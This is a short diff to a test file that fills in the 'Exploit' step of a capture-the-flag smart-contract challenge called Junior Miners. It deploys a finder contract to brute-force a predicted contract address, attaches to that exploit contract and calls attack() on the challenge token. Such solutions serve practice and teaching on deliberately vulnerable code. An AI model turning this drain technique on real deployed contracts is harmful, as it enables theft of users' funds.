@@ -24,6 +24,17 @@ describe('[Challenge] Junior Miners', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        const FinderFactory = await ethers.getContractFactory("JuniorMinersFinder", attacker);
+        for (let nonce = 0; nonce <= 1; nonce++) {
+            this.finder = await FinderFactory.deploy();
+        }
+
+        const finderTx = await this.finder.find(120, DEPOSIT_ADDRESS);
+        const { events } = await finderTx.wait();
+
+        const ExploitFactory = await ethers.getContractFactory("JuniorMinersExploit", attacker);
+        this.exploit = await ExploitFactory.attach(events[0].args.exploit);
+        await this.exploit.attack(this.token.address)
     });
 
     after(async function () {
